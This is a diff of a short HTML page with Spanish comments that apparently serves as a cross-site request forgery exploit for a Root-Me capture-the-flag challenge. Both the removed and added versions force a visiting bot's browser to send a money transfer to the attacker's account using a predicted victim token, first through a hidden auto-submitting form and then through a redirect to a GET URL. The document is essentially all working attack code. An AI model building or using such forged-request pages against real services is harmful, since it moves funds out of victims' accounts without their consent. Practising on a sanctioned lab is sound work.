@@ -1,35 +1,16 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Cargando proyecto...</title>
-</head>
 <body>
     <script>
-        // Creamos el formulario dinámicamente
-        var f = document.createElement("form");
-        f.action = "https://instance-019c1d39-1877-73ea-8b32-2bc46600599b.challenges.root-me.pro/transfer";
-        f.method = "POST";
-
-        // Parámetros del ataque
-        var data = {
-            "token": "6594ddfb4300bf02000000", // Token predicho para 'the_dwalt00ns'
-            "recipient": "test",             // TU nombre de usuario
-            "amount": "10000000"           // Cantidad para ser millonario
-        };
-
-        for (var key in data) {
-            var input = document.createElement("input");
-            input.type = "hidden";
-            input.name = key;
-            input.value = data[key];
-            f.appendChild(input);
-        }
-
-        document.body.appendChild(f);
+        // Si el backend es permisivo, esto funcionará enviando las cookies
+        const victimToken = "6594d3fb4300bf02000000"; // Corregido d3
+        const recipient = "test";
+        const amount = "1000";
         
-        // Enviamos el formulario. Esto hará que la página del bot navegue
-        // directamente hacia el banco.
-        f.submit();
+        const exploitUrl = `https://instance-019c1d39-1877-73ea-8b32-2bc46600599b.challenges.root-me.pro/transfer?token=${victimToken}&recipient=${recipient}&amount=${amount}`;
+        
+        // Forzamos al bot a navegar a esa URL
+        window.location.href = exploitUrl;
     </script>
 </body>
 </html>
